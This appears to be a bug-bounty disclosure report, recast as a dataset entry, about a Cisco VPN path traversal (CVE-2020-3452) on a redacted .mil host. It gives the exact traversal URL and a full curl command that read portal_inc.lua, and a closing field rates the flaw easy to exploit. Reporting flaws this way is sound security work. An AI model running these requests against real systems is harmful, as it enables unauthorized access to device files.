title: [██████████.mil] Cisco VPN Service Path Traversal
content:
Hi team.
 
# Summary
The Cisco VPN Service at ██████.mil is vulnerable to the CVE-2020-3452 vulnerability, which allows path traversing within the web service's file system on the targeted device.
 
# Steps to Reproduce
Make a GET request to:
Code 119 Bytes
1https://███████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
cURL command:
Code 635 Bytes
1curl -i -s -k -X $'GET' \
2    -H $'Host: █████.mil' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://█████.mil/+CSCOE+/logon.html?fcadbadd=1' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: webvpnlogin=1; webvpnLang=en' -H $'Upgrade-Insecure-Requests: 1' \
3    -b $'webvpnlogin=1; webvpnLang=en' \
4    $'https://███.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
..and get the content of the portal_inc.lua file.
███████
 
Impact
According to Cisco, this vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files, however, it has a CVE 7.5 (High) score.
steps: Make a GET request to the vulnerable endpoint: https://███████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
Use a tool like cURL to send the request and retrieve the content of the portal_inc.lua file
vuln_description: The Cisco VPN Service at ██████.mil is vulnerable to CVE-2020-3452, a path traversal vulnerability that allows an attacker to access files within the web service's file system on the targeted device.
reason: The vulnerability involves a straightforward path traversal attack with no complex interactions or state manipulations. The attack is well-documented and uses a known CVE, making it relatively easy to discover and exploit.
